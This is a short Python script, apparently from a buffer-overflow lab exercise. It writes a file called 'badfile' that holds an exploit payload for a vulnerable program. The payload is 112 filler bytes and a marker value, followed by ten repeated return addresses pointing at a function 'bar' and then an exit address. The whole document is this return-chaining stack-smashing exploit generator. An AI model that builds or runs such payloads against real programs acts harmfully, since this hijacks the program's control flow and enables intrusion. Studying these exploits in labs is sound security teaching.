#!/usr/bin/python3
import sys

def tobytes(value):
    return (value).to_bytes(4, byteorder='little')

bar_addr = 0x565562d0
exit_addr = 0xf7dfcec0

content = bytearray(0xaa for i in range(112))
content += tobytes(0xFFFFFFFF)

for i in range(10):
    content += tobytes(bar_addr)

content += tobytes(exit_addr)

with open("badfile", "wb") as f:
    f.write(content)
